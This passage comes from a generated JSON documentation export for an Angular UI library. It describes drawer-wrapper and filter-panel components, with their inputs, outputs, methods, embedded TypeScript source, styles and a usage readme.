        "id": "component-StoDrawerWrapperComponent-7141c2d7ebfe1a3bddbe9b2d2f0783bb8abd4eaca74e777f52ab8dc90a061eab6c7a8408855653b5836fe43ceebb0c7b698c4f647eb74c0ab3d3f03c25232243",
        "file": "libs/drawer/src/lib/sto-drawer/sto-drawer-wrapper.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-drawer-wrapper",
        "styleUrls": [
          "./sto-drawer-wrapper.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-drawer-wrapper.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [],
        "outputsClass": [],
        "propertiesClass": [],
        "methodsClass": [],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import { Component } from '@angular/core';\r\n\r\n@Component({\r\n  selector: 'sto-drawer-wrapper',\r\n  templateUrl: './sto-drawer-wrapper.component.html',\r\n  styleUrls: [ './sto-drawer-wrapper.component.scss' ]\r\n})\r\nexport class StoDrawerWrapperComponent {\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ":host {\r\n  position: relative;\r\n  transform: translate3d(0,0,0);\r\n}\r\ndiv.wrapper {\r\n  margin: 5px 0px;\r\n  display: block;\r\n}\r\ndiv.content {\r\n  display: block;\r\n}",
            "styleUrl": "./sto-drawer-wrapper.component.scss"
          }
        ],
        "stylesData": "",
        "templateData": "<div class=\"wrapper\">\r\n\t<ng-content select=\"sto-sidebar\"></ng-content>\r\n\t<div class=\"content\">\r\n\t\t<ng-content></ng-content>\r\n\t</div>\r\n</div>"
      },
      {
        "name": "StoFilterActionsBar",
        "id": "directive-StoFilterActions-b92d3ebb7c61d83c15cb525cadb87804be4d4b07d05d3fd85c3ff27273809d1e3d6be095b8cd41e00f344934d3f95e15f0ca75e111d0f095dff0a668c717f2b8",
        "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "encapsulation": [],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-filter-actions-bar",
        "styleUrls": [],
        "styles": [],
        "template": "<ng-content></ng-content>\n<button mat-icon-button\n        class=\"toggle-expand-button\"\n        *ngIf=\"expandable\"\n        title=\"Toggle filter panel\"\n        (click)=\"toggle.emit()\">\n  <mat-icon>filter_list</mat-icon>\n</button>\n\n",
        "templateUrl": [],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "expandable",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 210,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "expanded",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 202,
            "type": "boolean",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "toggle",
            "defaultValue": "new EventEmitter<void>()",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 213,
            "type": "EventEmitter"
          }
        ],
        "propertiesClass": [
          {
            "name": "_expanded",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "boolean",
            "optional": false,
            "description": "",
            "line": 211,
            "modifierKind": [
              121
            ]
          },
          {
            "name": "hasClass",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "type": "",
            "optional": false,
            "description": "",
            "line": 200,
            "decorators": [
              {
                "name": "HostBinding",
                "stringifiedArguments": "'class.sto-filter-actions'"
              }
            ]
          }
        ],
            "methodsClass": [
              {
                "name": "onChange",
                "args": [
                  {
                    "name": "event",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 216,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "class.sto-filter-actions",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 200,
            "type": "boolean",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  Directive,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnInit,\r\n  Output,\r\n  ViewChild,\r\n  ViewContainerRef,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { FilterForm, FilterList } from './filter';\r\n\r\n/**\r\n * Sto filter panel is an extension of mat-accordion\r\n */\r\n@Component({\r\n  selector: 'sto-filter-panel',\r\n  templateUrl: './sto-filter-panel.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  styleUrls: [ './sto-filter-panel.component.scss' ]\r\n})\r\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\r\n  set contentHeight(contentHeight: number) {\r\n    this._contentHeight = contentHeight;\r\n  }\r\n\r\n  get contentHeight(): number {\r\n    return this._contentHeight;\r\n  }\r\n\r\n  /**\r\n   * If the filter panel should be expandable. Default true.\r\n   */\r\n  @Input()\r\n  expandable = true;\r\n\r\n  /**\r\n   * If the filter panel should be expanded by default. Default false.\r\n   */\r\n  @Input()\r\n  expanded: boolean;\r\n\r\n  /**\r\n   * List of active filters.\r\n   */\r\n  @Input()\r\n  filterList: FilterList[];\r\n\r\n  /**\r\n   * Emits {isExpanded: boolean, contentHeight: number } where\r\n   * isExpanded is true if the panel opens and false if not.\r\n   * ContentHeight is the height of the expanded content i pixels.\r\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\r\n   */\r\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\r\n  /**\r\n   * Emits when a filter should be cleared (if applicable)\r\n   */\r\n  @Output()\r\n  clearFilter = new EventEmitter();\r\n\r\n  /**\r\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\r\n  /**\r\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\r\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\r\n\r\n  @Input()\r\n  public host: FilterForm<Record<string, unknown>>;\r\n  private _contentHeight: number;\r\n\r\n  public hasSeperator = false;\r\n\r\n  constructor(\r\n    private cdr: ChangeDetectorRef,\r\n    private vcRef: ViewContainerRef) {\r\n    try {\r\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n      this.host = ( this.vcRef as any )._view.context;\r\n    } catch ( ex ) {\r\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\r\n    }\r\n  }\r\n\r\n  public toggle() {\r\n    this.expanded = !this.expanded;\r\n    this.setContentHeight();\r\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\r\n  }\r\n\r\n  ngOnInit() {\r\n    if ( this.expandable ) {\r\n      if ( this.expanded === undefined ) {\r\n        this.expanded = true;\r\n      }\r\n    } else {\r\n      this.expanded = false;\r\n    }\r\n\r\n    this.needSeperator();\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.needSeperator();\r\n    this.setContentHeight();\r\n  }\r\n\r\n  private setContentHeight() {\r\n    const element = this.filterForm.nativeElement;\r\n    if ( element ) {\r\n      const contentArea = element.parentElement;\r\n      this.contentHeight = contentArea?.offsetHeight || 0;\r\n    }\r\n  }\r\n\r\n  public needSeperator() {\r\n    this.hasSeperator = false;\r\n    if ( this.contentWrapper && this.contentWrapper2 ) {\r\n      const el1 = this.contentWrapper.nativeElement;\r\n      const el2 = this.contentWrapper2.nativeElement;\r\n      if ( el1.children && el2.children ) {\r\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\r\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\r\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\r\n\r\n          this.hasSeperator = hasActionButtons && hasTableButtons;\r\n          this.cdr.detectChanges();\r\n        }\r\n      }\r\n    }\r\n\r\n\r\n  }\r\n\r\n  _clearFilter(key: string, index?: number) {\r\n    if (index === null) {\r\n      return;\r\n    }\r\n    try {\r\n      this.host.clearFilter(key, index);\r\n    } catch {\r\n      this.clearFilter.emit({ key, index });\r\n    }\r\n  }\r\n}\r\n\r\n/**\r\n * <mat-panel-description> directive.\r\n *\r\n * This direction is to be used inside of the MdExpansionPanelHeader component.\r\n */\r\n@Directive({\r\n  // eslint-disable-next-line @angular-eslint/directive-selector\r\n  selector: 'sto-filter-title'\r\n})\r\nexport class StoFilterTitle {\r\n}\r\n\r\n\r\n@Directive({\r\n  selector: 'sto-filter-table-actions'\r\n})\r\nexport class StoFilterTableActions {\r\n  @HostBinding('class.sto-filter-table-actions')\r\n  className = true;\r\n}\r\n\r\n@Directive({\r\n  selector: 'sto-filter-actions'\r\n})\r\nexport class StoFilterActions {\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-filter-actions-bar',\r\n  template: `\r\n    <ng-content></ng-content>\r\n    <button mat-icon-button\r\n            class=\"toggle-expand-button\"\r\n            *ngIf=\"expandable\"\r\n            title=\"Toggle filter panel\"\r\n            (click)=\"toggle.emit()\">\r\n      <mat-icon>filter_list</mat-icon>\r\n    </button>\r\n\r\n  `\r\n})\r\n// eslint-disable-next-line @angular-eslint/component-class-suffix\r\nexport class StoFilterActionsBar {\r\n  @HostBinding('class.sto-filter-actions')\r\n  hasClass = true;\r\n\r\n  @Input() set expanded(expanded: boolean) {\r\n    this._expanded = expanded;\r\n  }\r\n\r\n  get expanded(): boolean {\r\n    return this._expanded;\r\n  }\r\n\r\n  @Input() expandable: boolean;\r\n  private _expanded: boolean;\r\n\r\n  @Output() toggle = new EventEmitter<void>();\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  onChange(event: unknown) {\r\n    // console.log($event);\r\n  }\r\n\r\n\r\n}\r\n\r\n",
        "assetsDirs": [],
        "styleUrlsData": "",
        "stylesData": "",
        "accessors": {
          "expanded": {
            "name": "expanded",
            "setSignature": {
              "name": "expanded",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "expanded",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 202,
              "jsdoctags": [
                {
                  "name": "expanded",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "expanded",
              "type": "boolean",
              "returnType": "boolean",
              "line": 206
            }
          }
        },
        "readme": "<h3 id=\"sto-filter-panel\">Sto filter panel</h3>\n<p>Filter panel is a togglable panel with a header and a content area, and is an extension of expansion panel from material.\nHas build in content areas for title, table actions and filter actions.\nThe panel has a toggle button that open and closes the content area and emits an event with the height of the content area.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot; (toggled)=&quot;toggleService.isToggled.emit($event)&quot;&gt;\n    &lt;sto-filter-title&gt;Integration Logs&lt;/sto-filter-title&gt;\n        &lt;sto-filter-table-actions&gt;\n           &lt;button mat-button&gt;\n           New&lt;mat-icon&gt;arrow_drop_down&lt;/mat-icon&gt;\n           &lt;/button&gt;    \n        &lt;/sto-filter-table-actions&gt;\n           &lt;sto-filter-actions&gt;\n                &lt;button mat-icon-button&gt;\n                  &lt;mat-icon&gt;refresh&lt;/mat-icon&gt;\n               &lt;/button&gt;\n            &lt;/sto-filter-actions&gt;\n        &lt;form class=&quot;sto-form sto-grid sto-grid--6&quot; [formGroup]=&quot;form&quot; &gt;\n             &lt;div class=&quot;sto-grid__column&quot;&gt;\n                   &lt;mat-form-field&gt;\n                     ...\n                    &lt;/mat-form-field&gt;\n             &lt;/div&gt;\n        &lt;/form&gt;\n&lt;/sto-filter-panel&gt;</code></pre></div><p>####Selector / Content projection</p>\n<h5 id=\"sto-filter-title\">sto-filter-title</h5>\n<p>The title. Usually just a string but could be html.</p>\n<h5 id=\"sto-filter-table-actions\">sto-filter-table-actions</h5>\n<p>Buttons and actions on the left side of the separator if both table and filter actions is present.\n(The name is from a time where all actions left of the separator was related to the table).</p>\n<h5 id=\"sto-filter-actions\">sto-filter-actions</h5>\n<p>Buttons and actions on the right side of the separator if both table and filter actions is present.\n(The name is from a time where all actions right of the separator was related to the table).</p>\n<p>####Input</p>\n<h5 id=\"expandable\">expandable</h5>\n<p>If the filter panel should be expandable. Default true.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expandable]=&quot;true&quot;&gt;</code></pre></div><h5 id=\"expanded\">expanded</h5>\n<p>If the filter panel should be expanded by default. Default false.</p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel [expanded]=&quot;true&quot;&gt;</code></pre></div><p>####Output</p>\n<h5 id=\"toggled\">toggled</h5>\n<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content. </p>\n<div><pre class=\"line-numbers\"><code class=\"language-html\">&lt;sto-filter-panel (toggled)=&quot;onToggle($event)&quot;&gt;</code></pre></div>"
      },
      {
        "name": "StoFilterPanelComponent",
        "id": "component-StoFilterPanelComponent-b92d3ebb7c61d83c15cb525cadb87804be4d4b07d05d3fd85c3ff27273809d1e3d6be095b8cd41e00f344934d3f95e15f0ca75e111d0f095dff0a668c717f2b8",
        "file": "libs/common/src/lib/sto-filter/sto-filter-panel.component.ts",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [],
        "selector": "sto-filter-panel",
        "styleUrls": [
          "./sto-filter-panel.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./sto-filter-panel.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "expandable",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nIf the filter panel should be expandable. Default true.\n",
            "description": "<p>If the filter panel should be expandable. Default true.</p>\n",
            "line": 40,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "expanded",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nIf the filter panel should be expanded by default. Default false.\n",
            "description": "<p>If the filter panel should be expanded by default. Default false.</p>\n",
            "line": 46,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "filterList",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nList of active filters.\n",
            "description": "<p>List of active filters.</p>\n",
            "line": 52,
            "type": "FilterList[]",
            "decorators": []
          },
          {
            "name": "host",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 78,
            "type": "FilterForm<Record<string, >>",
            "decorators": []
          }
        ],
        "outputsClass": [
          {
            "name": "clearFilter",
            "defaultValue": "new EventEmitter()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits when a filter should be cleared (if applicable)\n",
            "description": "<p>Emits when a filter should be cleared (if applicable)</p>\n",
            "line": 65,
            "type": "EventEmitter"
          },
          {
            "name": "toggled",
            "defaultValue": "new EventEmitter<{ isExpanded: boolean, contentHeight: number }>()",
            "deprecated": false,
            "deprecationMessage": "",
            "rawdescription": "\n\nEmits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content i pixels.\n {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\n",
            "description": "<p>Emits {isExpanded: boolean, contentHeight: number } where\nisExpanded is true if the panel opens and false if not.\nContentHeight is the height of the expanded content i pixels.\n {EventEmitter&lt;{isExpanded: boolean, contentHeight: number }&gt;}</p>\n",
            "line": 60,
            "type": "EventEmitter"
          }
        ],
            "propertiesClass": [
              {
                "name": "_contentHeight",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 79,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "contentWrapper",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "literal type",
                "optional": false,
                "description": "<p>Buttons and actions on the left side of the separator if both table and filter actions is present.</p>\n",
                "line": 70,
                "rawdescription": "\n\nButtons and actions on the left side of the separator if both table and filter actions is present.\n",
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'tableActions'"
                  }
                ]
              },
              {
                "name": "contentWrapper2",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "literal type",
                "optional": false,
                "description": "<p>Buttons and actions on the right side of the separator if both table and filter actions is present.</p>\n",
                "line": 74,
                "rawdescription": "\n\nButtons and actions on the right side of the separator if both table and filter actions is present.\n",
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'filterActions'"
                  }
                ]
              },
              {
                "name": "filterForm",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "literal type",
                "optional": false,
                "description": "",
                "line": 75,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'filterForm'"
                  }
                ]
              },
              {
                "name": "hasSeperator",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 81,
                "modifierKind": [
                  123
                ]
              }
            ],
            "methodsClass": [
                {
                    "name": "_clearFilter",
                    "args": [
                      {
                        "name": "key",
                        "type": "string",
                        "deprecated": false,
                        "deprecationMessage": ""
                      },
                      {
                        "name": "index",
                        "type": "number",
                        "deprecated": false,
                        "deprecationMessage": "",
                        "optional": true
                      }
                    ],
                  "optional": false,
                  "returnType": "void",
                  "typeParameters": [],
                  "line": 144,
                  "deprecated": false,
                  "deprecationMessage": "",
                  "jsdoctags": [
                    {
                      "name": "key",
                      "type": "string",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "tagName": {
                        "text": "param"
                      }
                    },
                    {
                      "name": "index",
                      "type": "number",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "optional": true,
                      "tagName": {
                        "text": "param"
                      }
                    }
                  ]
                },
              {
                "name": "needSeperator",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 125,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "ngAfterViewInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 112,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 100,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "setContentHeight",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 117,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "toggle",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 94,
                "deprecated": false,
                "deprecationMessage": "",
                "modifierKind": [
                  123
                ]
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [],
        "hostListeners": [],
        "description": "<p>Sto filter panel is an extension of mat-accordion</p>\n",
        "rawdescription": "\n\nSto filter panel is an extension of mat-accordion\n",
        "type": "component",
        "sourceCode": "import {\r\n  AfterViewInit,\r\n  ChangeDetectorRef,\r\n  Component,\r\n  Directive,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnInit,\r\n  Output,\r\n  ViewChild,\r\n  ViewContainerRef,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { FilterForm, FilterList } from './filter';\r\n\r\n/**\r\n * Sto filter panel is an extension of mat-accordion\r\n */\r\n@Component({\r\n  selector: 'sto-filter-panel',\r\n  templateUrl: './sto-filter-panel.component.html',\r\n  encapsulation: ViewEncapsulation.None,\r\n  styleUrls: [ './sto-filter-panel.component.scss' ]\r\n})\r\nexport class StoFilterPanelComponent implements OnInit, AfterViewInit {\r\n  set contentHeight(contentHeight: number) {\r\n    this._contentHeight = contentHeight;\r\n  }\r\n\r\n  get contentHeight(): number {\r\n    return this._contentHeight;\r\n  }\r\n\r\n  /**\r\n   * If the filter panel should be expandable. Default true.\r\n   */\r\n  @Input()\r\n  expandable = true;\r\n\r\n  /**\r\n   * If the filter panel should be expanded by default. Default false.\r\n   */\r\n  @Input()\r\n  expanded: boolean;\r\n\r\n  /**\r\n   * List of active filters.\r\n   */\r\n  @Input()\r\n  filterList: FilterList[];\r\n\r\n  /**\r\n   * Emits {isExpanded: boolean, contentHeight: number } where\r\n   * isExpanded is true if the panel opens and false if not.\r\n   * ContentHeight is the height of the expanded content i pixels.\r\n   *  {EventEmitter<{isExpanded: boolean, contentHeight: number }>}\r\n   */\r\n  @Output() toggled = new EventEmitter<{ isExpanded: boolean, contentHeight: number }>();\r\n  /**\r\n   * Emits when a filter should be cleared (if applicable)\r\n   */\r\n  @Output()\r\n  clearFilter = new EventEmitter();\r\n\r\n  /**\r\n   * Buttons and actions on the left side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('tableActions') contentWrapper: { nativeElement: HTMLElement; };\r\n  /**\r\n   * Buttons and actions on the right side of the separator if both table and filter actions is present.\r\n   */\r\n  @ViewChild('filterActions') contentWrapper2: { nativeElement: HTMLElement; };\r\n  @ViewChild('filterForm') filterForm: { nativeElement: HTMLElement; };\r\n\r\n  @Input()\r\n  public host: FilterForm<Record<string, unknown>>;\r\n  private _contentHeight: number;\r\n\r\n  public hasSeperator = false;\r\n\r\n  constructor(\r\n    private cdr: ChangeDetectorRef,\r\n    private vcRef: ViewContainerRef) {\r\n    try {\r\n      // eslint-disable-next-line @typescript-eslint/no-explicit-any\r\n      this.host = ( this.vcRef as any )._view.context;\r\n    } catch ( ex ) {\r\n      // most likely this fails only for tests after Ivy (Angular 9), as it no longer wraps with a component.\r\n    }\r\n  }\r\n\r\n  public toggle() {\r\n    this.expanded = !this.expanded;\r\n    this.setContentHeight();\r\n    this.toggled.emit({ isExpanded: this.expanded, contentHeight: this.contentHeight });\r\n  }\r\n\r\n  ngOnInit() {\r\n    if ( this.expandable ) {\r\n      if ( this.expanded === undefined ) {\r\n        this.expanded = true;\r\n      }\r\n    } else {\r\n      this.expanded = false;\r\n    }\r\n\r\n    this.needSeperator();\r\n  }\r\n\r\n  ngAfterViewInit() {\r\n    this.needSeperator();\r\n    this.setContentHeight();\r\n  }\r\n\r\n  private setContentHeight() {\r\n    const element = this.filterForm.nativeElement;\r\n    if ( element ) {\r\n      const contentArea = element.parentElement;\r\n      this.contentHeight = contentArea?.offsetHeight || 0;\r\n    }\r\n  }\r\n\r\n  public needSeperator() {\r\n    this.hasSeperator = false;\r\n    if ( this.contentWrapper && this.contentWrapper2 ) {\r\n      const el1 = this.contentWrapper.nativeElement;\r\n      const el2 = this.contentWrapper2.nativeElement;\r\n      if ( el1.children && el2.children ) {\r\n        if ( el1.children.length > 0 && el2.children.length > 0 ) {\r\n          const hasActionButtons = el1.children[ 0 ].children.length > 0;\r\n          const hasTableButtons = el2.children[ 0 ].children.length > 0;\r\n\r\n          this.hasSeperator = hasActionButtons && hasTableButtons;\r\n          this.cdr.detectChanges();\r\n        }\r\n      }\r\n    }\r\n\r\n\r\n  }\r\n\r\n  _clearFilter(key: string, index?: number) {\r\n    if (index === null) {\r\n      return;\r\n    }\r\n    try {\r\n      this.host.clearFilter(key, index);\r\n    } catch {\r\n      this.clearFilter.emit({ key, index });\r\n    }\r\n  }\r\n}\r\n\r\n/**\r\n * <mat-panel-description> directive.\r\n *\r\n * This direction is to be used inside of the MdExpansionPanelHeader component.\r\n */\r\n@Directive({\r\n  // eslint-disable-next-line @angular-eslint/directive-selector\r\n  selector: 'sto-filter-title'\r\n})\r\nexport class StoFilterTitle {\r\n}\r\n\r\n\r\n@Directive({\r\n  selector: 'sto-filter-table-actions'\r\n})\r\nexport class StoFilterTableActions {\r\n  @HostBinding('class.sto-filter-table-actions')\r\n  className = true;\r\n}\r\n\r\n@Directive({\r\n  selector: 'sto-filter-actions'\r\n})\r\nexport class StoFilterActions {\r\n}\r\n\r\n@Component({\r\n  selector: 'sto-filter-actions-bar',\r\n  template: `\r\n    <ng-content></ng-content>\r\n    <button mat-icon-button\r\n            class=\"toggle-expand-button\"\r\n            *ngIf=\"expandable\"\r\n            title=\"Toggle filter panel\"\r\n            (click)=\"toggle.emit()\">\r\n      <mat-icon>filter_list</mat-icon>\r\n    </button>\r\n\r\n  `\r\n})\r\n// eslint-disable-next-line @angular-eslint/component-class-suffix\r\nexport class StoFilterActionsBar {\r\n  @HostBinding('class.sto-filter-actions')\r\n  hasClass = true;\r\n\r\n  @Input() set expanded(expanded: boolean) {\r\n    this._expanded = expanded;\r\n  }\r\n\r\n  get expanded(): boolean {\r\n    return this._expanded;\r\n  }\r\n\r\n  @Input() expandable: boolean;\r\n  private _expanded: boolean;\r\n\r\n  @Output() toggle = new EventEmitter<void>();\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  onChange(event: unknown) {\r\n    // console.log($event);\r\n  }\r\n\r\n\r\n}\r\n\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": "@use '@angular/material' as mat;\r\n\r\n$sto-filter-header-font-size: 18px;\r\n$sto-filter-header-line-height: 24px;\r\n\r\n.sto-filter {\r\n\r\n  .mat-button-toggle {\r\n    &-standalone.mat-button-toggle-appearance-standard {\r\n      border: 0;\r\n    }\r\n  }\r\n\r\n  box-shadow: none !important;\r\n\r\n  border-top-left-radius: 3px;\r\n  border-top-right-radius: 3px;\r\n\r\n  .mat-expansion-panel {\r\n    border-radius: 2px;\r\n  }\r\n\r\n  .mat-expansion-panel-header {\r\n    border-bottom: solid 1px var(--divider);\r\n\r\n    padding: 0 8px;\r\n    cursor: default;\r\n    border-bottom-left-radius: 0;\r\n    border-bottom-right-radius: 0;\r\n\r\n    &-title {\r\n      align-items: center;\r\n    }\r\n  }\r\n\r\n  .mat-expansion-panel-body {\r\n    padding: 24px 16px 0 16px;\r\n    margin: 0;\r\n  }\r\n\r\n  .mat-expansion-panel-header[aria-disabled=true] {\r\n    color: inherit;\r\n  }\r\n\r\n\r\n  .sto-filter-table-actions {\r\n\r\n    padding: 0;\r\n\r\n  }\r\n\r\n  .sto-filter-actions {\r\n    padding: 0 0 0 8px;\r\n\r\n\r\n  }\r\n\r\n  sto-filter-actions {\r\n    height: 32px;\r\n  }\r\n\r\n  .sto-filter-table-actions, .sto-filter-actions {\r\n    display: flex;\r\n    align-items: center;\r\n\r\n    .mat-icon {\r\n      cursor: pointer;\r\n    }\r\n\r\n    .mat-icon-button {\r\n    }\r\n  }\r\n\r\n\r\n  .mat-expansion-panel-header {\r\n    border-radius: 2px;\r\n  }\r\n\r\n\r\n  .mat-button-toggle-standalone {\r\n    width: 32px;\r\n    height: 32px;\r\n\r\n    .mat-button-toggle-label {\r\n      margin: 0;\r\n    }\r\n\r\n    .mat-button-toggle-label-content {\r\n      height: 100%;\r\n      display: flex;\r\n      align-items: center;\r\n      justify-content: center;\r\n    }\r\n  }\r\n\r\n  .separator {\r\n    display: inline-block;\r\n    width: 1px;\r\n    height: 24px;\r\n    margin: 8px 4px;\r\n  }\r\n\r\n  .content-wrapper {\r\n    display: flex;\r\n  }\r\n\r\n\r\n}\r\n\r\n",
            "styleUrl": "./sto-filter-panel.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "vcRef",
              "type": "ViewContainerRef",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 81,
          "jsdoctags": [
            {
              "name": "cdr",
              "type": "ChangeDetectorRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "vcRef",
              "type": "ViewContainerRef",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "implements": [
          "OnInit",
          "AfterViewInit"
        ],
        "accessors": {
          "contentHeight": {
            "name": "contentHeight",
            "setSignature": {
              "name": "contentHeight",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "contentHeight",
                  "type": "number",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 28,
              "jsdoctags": [
                {
                  "name": "contentHeight",
                  "type": "number",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "contentHeight",
              "type": "number",
              "returnType": "number",
              "line": 32
            }
          }
        },
